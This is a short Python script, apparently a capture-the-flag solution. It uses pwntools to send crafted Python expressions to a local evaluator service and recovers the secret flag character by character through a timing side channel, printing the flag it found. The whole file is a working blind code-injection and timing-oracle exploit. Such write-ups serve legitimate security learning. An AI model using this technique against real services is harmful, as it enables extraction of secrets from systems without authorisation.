from time import time
from tqdm import trange
from pwn import remote

tests = '_abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
payload = '[flag[{}] in "{}" or a for _ in "aaaaaaa"*100000]'
io = remote('localhost',1337)

bench = []
io.recvuntil(b'> ')

flag = 'SSMCTF{'
for i in trange(7,64): # flag is probably shorter than 64
    out = []
    for ch in tests:
        start = time()
        io.sendline(payload.format(i,ch).encode())
        io.recvuntil(b'> ')
        timetaken = time()-start
        if timetaken > 0.05:
            out.append(ch)
            break
    if len(out) > 1:
        raise ValueError
    if len(out) == 0:
        break
    flag += out[0]
flag += '}'
print(flag) # SSMCTF{wH0_ne3D5_std3Rr_wh3n_y0u_g0t_stdT1m3}